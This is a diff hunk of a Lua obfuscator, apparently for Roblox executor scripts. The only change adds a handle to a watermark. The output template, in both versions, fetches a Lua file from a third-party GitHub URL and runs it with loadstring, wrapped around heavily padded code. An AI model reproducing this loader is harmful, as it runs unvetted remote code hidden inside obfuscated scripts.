@@ -178,7 +178,7 @@ return function(script)
     for i = 1, 2000 do 
         obfuscated = obfuscated .. random_junk[math.random(1, #random_junk)]
     end 
-    local copy = "local _,run = {['obfuscated with hashfuscator v1.0.2.1']=nil},\nloadstring(game:HttpGet('https://raw.githubusercontent.com/zuhnosu/test/main/test.lua'))()([[%s]])()"
+    local copy = "local _,run = {['obfuscated with hashfuscator v1.0.2.1 | Neex#1111']=nil},\nloadstring(game:HttpGet('https://raw.githubusercontent.com/zuhnosu/test/main/test.lua'))()([[%s]])()"
     copy = copy:format('\n' .. obfuscated .. '\n')
     setclipboard(copy)
     return copy
